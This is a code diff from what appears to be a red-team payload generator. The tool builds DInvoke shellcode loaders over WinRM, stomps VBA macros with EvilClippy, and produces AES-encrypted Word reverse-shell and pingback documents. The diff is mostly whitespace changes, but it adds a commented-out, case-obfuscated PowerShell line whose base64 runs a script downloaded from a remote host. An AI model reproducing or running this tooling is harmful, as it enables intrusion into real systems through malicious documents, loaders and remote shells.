@@ -1008,7 +1008,7 @@ def generate_dinvoke_x64_x86(input_data: Dict) -> Optional[BytesIO]:
     with open(PAYLOAD_OUTPUT_PATH, "w") as f:
         f.write(payload)
 
-    
+
     # Prepare WinRM commands
     winrm_command = rf"""del .\stage-12.cs
 del .\exploit-program.exe
@@ -1022,7 +1022,7 @@ cd ..
 download ./exploit-program.exe /tmp/loader.exe
 download ./exploit-program.bin {DINVOKE_SHELLCODE_OUTPUT_PATH}
 exit"""
-    
+
     # print(winrm_command)
     run_winrm_commands(winrm_command)
 
@@ -1057,14 +1057,14 @@ def stomp_doc(path_original, stomp_version):
     os.system(cmd)
 
     set_rights_to_current_user = ""
-    
+
     print("[*] Running EvilClippy...")
     cmd = f"""{DOCKER_COMMAND} run -v {no_trailing}:/tmp/outfiles/ --rm evilclippy -t {stomp_version} -u {fake_vba} {doc_name}"""
     os.system(cmd)
     if 'sudo' in DOCKER_COMMAND:
         cmd = f"sudo chown $(id -u):$(id -g) {str(path_original).replace(".doc", "*")}"
         os.system(cmd)
-    
+
     print(f"[+] Macro stomped into {stomped_path}")
     return stomped_path
 
@@ -1078,7 +1078,7 @@ def generate_word_revshell_aes(lhost, lport, proxy, id, stomp_version, template_
     output_file_path_cache = output_file_path
     if stomp_version:
         output_file_path_cache = output_file_path.replace(".doc", "_EvilClippy.doc")
-    
+
     if os.path.exists(output_file_path_cache):
         # cached
         with open(output_file_path_cache, 'rb') as f:
@@ -1152,13 +1152,14 @@ def generate_word_pingback_aes(lhost, lport, proxy, id, stomp_version, template_
     output_file_path_cache = output_file_path
     if stomp_version:
         output_file_path_cache = output_file_path.replace(".doc", "_EvilClippy.doc")
-    
+
     if os.path.exists(output_file_path_cache):
         # cached
         with open(output_file_path_cache, 'rb') as f:
             return BytesIO(f.read())
     command_text = f"C:\Windows\System32\PING.EXE -n 1 {lhost}"
-    password = str(uuid.uuid4()).replace('-', '')
+    # command_text = f"powershell -c IEx([sYSteM.teXT.eNCOdING]::UtF8.GEtsTrInG([sySteM.CONVert]::FRoMbaSE64sTRInG('W1N5c3RlbS5OZXQuSHR0cFdlYlJlcXVlc3RdOjpEZWZhdWx0V2ViUHJveHkgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViUHJveHkoJG51bGwpOyBpZXgoKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8vMTkyLjE2OC40OS4xMTk6NDQzL3Avd2luL3BzL2M2MWNiODQ1YzcxMzQxMDFiMjZjNzQ2MjE3YWMzZmU0L3N0YXJ0Iikp')))"
+    password = str(uuid.uuid4()).replace('-', '').strip()
     encoded_powershell_command = encode_ps(command_text)
 
     payloads = {}
@@ -1242,11 +1243,11 @@ def word_get():
         return "Invalid id", 400
 
     if payload_type == "vba_shellcode":
-        
+
         if stomp_version and stomp_version != "2016x86":
             stomp_version = "2016x86"
             print(f"!!!! ONLY SUPPORTS x86 with VBA shellcode. Forcing stomp version {stomp_version}.")
-            
+
 
 
         payloads = gen_multiple_payloads(
